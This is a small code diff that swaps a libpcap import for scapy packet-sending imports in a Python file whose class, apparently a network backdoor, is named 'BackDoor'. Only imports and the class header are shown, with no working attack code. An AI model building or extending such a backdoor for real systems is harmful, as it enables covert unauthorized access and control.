@@ -1,6 +1,8 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-import libpcap as pcap
+from scapy.layers.inet import UDP, IP
+from scapy.all import send
+
 
 
 class BackDoor:
